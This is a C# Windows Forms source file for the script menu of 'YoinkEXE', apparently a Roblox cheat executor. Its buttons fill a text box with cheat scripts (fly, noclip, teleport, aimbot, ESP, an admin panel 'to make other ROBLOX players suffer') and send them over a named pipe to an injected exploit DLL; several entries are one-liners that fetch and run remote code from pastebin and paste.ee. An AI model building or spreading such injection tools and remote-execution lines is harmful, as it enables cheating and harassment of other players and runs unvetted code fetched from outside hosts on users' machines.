using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace YoinkEXE
{
    public partial class Scripts : Form
    {
        public Point PanelMouseDownLocation { get; private set; }

        public Scripts()
        {
            InitializeComponent();
            timer1.Start();
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            richTextBox2.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            for (int i = 1; i <= 9; i++)
            {
                base.Opacity -= 0.1;
                await Task.Delay(1);
            }
            base.WindowState = FormWindowState.Minimized;
            base.Opacity = 0.95;
        }

        private void Scripts_Load(object sender, EventArgs e)
        {

        }

        private async void button2_Click(object sender, EventArgs e)
        {
            button2.Text = "Executing";
            await Task.Delay(1000);
            if (!NamedPipes.NamedPipeExist(NamedPipes.luapipename))
            {
                MessageBox.Show(string.Concat("Click Inject button to inject ", Functions.exploitdllname, " before Using this!"), "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {
                NamedPipes.LuaPipe(this.richTextBox2.Text);
            }
            button2.Text = "Execute";
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            for (int i = 1; i <= 9; i++)
            {
                base.Opacity -= 0.1;
                await Task.Delay(1);
            }
            base.Opacity = 0.95;
            try
            {
                base.Close();
            }
            catch
            {
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Lets you fly around in game by pressing 'F'";
            richTextBox2.Text = richTextBox3.Text;
            pictureBox2.Visible = true;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Left)
            {
                Scripts.ReleaseCapture();
                Scripts.SendMessage(base.Handle, 161, 2, 0);
            }
        }

        [DllImport("User32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        public static extern bool ReleaseCapture();

        [DllImport("User32.dll", CharSet = CharSet.None, ExactSpelling = false)]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        public class FileObject
        {
            public string FileContent
            {
                get;
                set;
            }

            public string FileName
            {
                get;
                set;
            }

            public FileObject()
            {
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Hold the ALT key then click anything you want to delete";
            richTextBox2.Text = richTextBox4.Text;
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = true;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Gives you a tool that will teleport you anywhere you click";
            richTextBox2.Text = richTextBox5.Text;
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = true;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Allows you to walk through objects";
            richTextBox2.Text = richTextBox6.Text;
            pictureBox2.Visible = false;
            pictureBox3.Visible = true;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button8_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Gives you a set of tools to edit, move and delete objects in a game";
            richTextBox2.Text = richTextBox7.Text;
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = true;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button9_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Admin commands for any game";
            richTextBox2.Text = "loadstring(game:HttpGet(('https://pastebin.com/raw/MjBzRjmT'),true))()";
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = true;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button10_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "An Aimbot and ESP GUI";
            richTextBox2.Text = richTextBox8.Text;
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = true;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button11_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "A nice Admin Panel with a bunch of features to make other ROBLOX players suffer >:)";
            richTextBox2.Text = richTextBox9.Text;
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = true;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button13_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Best version of DEX Explorer from a free exploit";
            richTextBox2.Text = "loadstring(game:HttpGet(('https://paste.ee/r/19qH2/0'),true))()";
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = true;
            pictureBox12.Visible = false;
            pictureBox13.Visible = false;
        }

        private void button12_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "ESP that works on all games";
            richTextBox2.Text = "loadstring(game:HttpGet(('https://pastebin.com/raw/wP5VuSFP'),true))()";
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = true;
            pictureBox13.Visible = false;
        }

        private void button14_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "Aimbot that works on all games";
            richTextBox2.Text = "loadstring(game:GetObjects('rbxassetid://2388477622')[1].Source)()";
            pictureBox2.Visible = false;
            pictureBox3.Visible = false;
            pictureBox4.Visible = false;
            pictureBox5.Visible = false;
            pictureBox6.Visible = false;
            pictureBox7.Visible = false;
            pictureBox8.Visible = false;
            pictureBox9.Visible = false;
            pictureBox10.Visible = false;
            pictureBox11.Visible = false;
            pictureBox12.Visible = false;
            pictureBox13.Visible = true;
        }

        private async void timer1_Tick(object sender, EventArgs e)
        {
            this.timer1.Stop();
            for (int i = 1; i <= 9; i++)
            {
                base.Opacity += 0.1;
                await Task.Delay(1);
            }
            base.Opacity = 1;
        }
    }
}
